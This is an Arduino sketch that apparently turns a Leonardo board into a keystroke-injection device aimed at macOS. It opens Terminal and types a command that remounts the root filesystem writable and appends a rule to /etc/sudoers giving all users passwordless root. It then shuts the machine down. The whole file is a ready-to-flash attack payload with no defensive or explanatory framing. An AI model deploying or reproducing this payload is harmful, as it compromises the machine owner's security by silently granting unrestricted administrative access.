#define kbd_es_es
#include <phukdlib_leonardo.h>

void setup() {
  Keyboard.begin();
}

void loop() {
  delay(5000);
  CommandAtRunBarOSX("terminal");
  delay(3000);
  Keyboard.println("mount -uw / && chmod 755 /etc/sudoers && echo 'ALL    ALL=(ALL) NOPASSWD: ALL' >> /etc/sudoers && chmod 440 /etc/sudoers && shutdown -h now");
  delay(3000);
  while(1);
}
